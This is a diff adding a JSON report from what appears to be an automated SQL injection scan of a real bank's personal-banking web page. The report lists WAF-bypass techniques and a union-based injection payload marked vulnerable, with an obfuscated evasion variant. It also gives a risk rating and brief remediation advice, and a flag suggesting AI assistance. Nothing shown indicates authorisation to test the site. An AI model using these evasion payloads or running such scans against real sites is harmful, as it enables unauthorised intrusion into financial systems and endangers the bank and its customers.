@@ -1,0 +1,44 @@
+{
+  "target_url": "https://www.krungsri.com/th/personal",
+  "timestamp": "2025-10-27 13:57:11",
+  "waf_analysis": {
+    "detected_waf": "unknown",
+    "confidence": 50,
+    "recommendation": "使用通用绕过技术",
+    "bypass_techniques": [
+      "space2comment",
+      "randomcase",
+      "between"
+    ]
+  },
+  "test_results": {
+    "tested_payloads": 5,
+    "successful_payloads": 1,
+    "vulnerable_types": [
+      "union_based"
+    ],
+    "payload_details": [
+      {
+        "payload": "' UNION SELECT 1,2,3-- ",
+        "enhanced_payload": "'/**/unioN/**/sELEct/**/1,2,3--/**/",
+        "type": "union_based",
+        "vulnerable": true,
+        "response_time": 1.5544085502624512,
+        "status_code": 200
+      }
+    ],
+    "waf_bypassed": false,
+    "success_rate": 20.0
+  },
+  "security_analysis": {
+    "risk_level": "medium",
+    "confidence": 50,
+    "vulnerability_analysis": "需要进一步测试",
+    "recommendations": [
+      "实施参数化查询",
+      "部署WAF防护"
+    ],
+    "exploitation_possibility": "medium"
+  },
+  "gemini_enhanced": true
+}
